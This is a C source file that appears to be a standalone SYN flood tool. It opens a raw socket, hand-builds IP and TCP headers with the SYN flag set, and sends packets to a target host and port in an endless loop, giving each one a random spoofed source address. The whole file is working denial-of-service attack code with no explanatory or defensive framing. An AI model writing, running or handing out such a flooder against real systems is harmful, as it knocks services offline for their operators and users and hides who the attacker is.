#include<errno.h>
#include<string.h>
#include<netdb.h>
#include<stdio.h>
#include<stdlib.h>
#include<unistd.h>
#include<netinet/ip.h>
#include<netinet/tcp.h>

void send_data(int sockfd, struct sockaddr_in* addr, char* port);
unsigned short check_sum(unsigned short* addr, int len);

// ./argv[0] des_hostname/ip   des_port  local_port
int main(int argc, char* argv[])
{
    int sockfd;
    struct sockaddr_in addr;
    struct hostent* host;
    int on = 1;

    if (argc != 4) {
        fprintf(stderr, "Usage:%s des_hostname/ip des_port  local_port\n", argv[0]);
        exit(EXIT_FAILURE);
    }

    memset(&addr, 0, sizeof(struct sockaddr_in));
    addr.sin_family = AF_INET;

    if (inet_aton(argv[1], &addr.sin_addr) == 0) {
        host = gethostbyname(argv[1]);

        if (host == NULL) {
            fprintf(stderr, "HostName Error:%s\n\a", hstrerror(h_errno));
            exit(EXIT_FAILURE);
        }

        addr.sin_addr = *(struct in_addr*)(host->h_addr_list[0]);
    }

    addr.sin_port = htons(atoi(argv[2]));

    sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);

    if (sockfd < 0) {
        fprintf(stderr, "Socket Error:%s\n\a", strerror(errno));
        exit(EXIT_FAILURE);
    }

    setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL, &on, sizeof(on));

    send_data(sockfd, &addr, argv[3]);
}

void send_data(int sockfd, struct sockaddr_in* addr, char* port)
{
    char buffer[100];
    struct iphdr* ip;
    struct tcphdr* tcp;
    int head_len;

    head_len = sizeof(struct iphdr) + sizeof(struct tcphdr);
    bzero(buffer, 100);
    ip = (struct iphdr*)buffer;
    ip->version = IPVERSION;
    ip->ihl = sizeof(struct ip) >> 2;
    ip->tos = 0;
    ip->tot_len = htons(head_len);
    ip->id = 0;
    ip->frag_off = 0;
    ip->ttl = MAXTTL;
    ip->protocol = IPPROTO_TCP;

    ip->check = 0;
    ip->daddr = addr->sin_addr.s_addr;

    tcp = (struct tcphdr*)(buffer + sizeof(struct ip));
    tcp->source = htons(atoi(port));
    tcp->dest = addr->sin_port;
    tcp->seq = random();
    tcp->ack_seq = 0;
    tcp->doff = 5;
    tcp->syn = 1;
    tcp->check = 0;


    while (1) {
        ip->saddr = random();
        tcp->check = 0;
        tcp->check = check_sum((unsigned short*)tcp,
                               sizeof(struct tcphdr));
        sendto(sockfd, buffer, head_len, 0, (struct sockaddr*)addr,
               (socklen_t)sizeof(struct sockaddr_in));
    }
}

unsigned short check_sum(unsigned short* addr, int len)
{
    register int nleft = len;
    register int sum = 0;
    register short* w = addr;
    short answer = 0;

    while (nleft > 1) {
        sum += *w++;
        nleft -= 2;
    }

    if (nleft == 1) {
        *(unsigned char*)(&answer) = *(unsigned char*)w;
        sum += answer;
    }

    sum = (sum >> 16) + (sum & 0xffff);
    sum += (sum >> 16);
    answer = ~sum;
    return (answer);
}
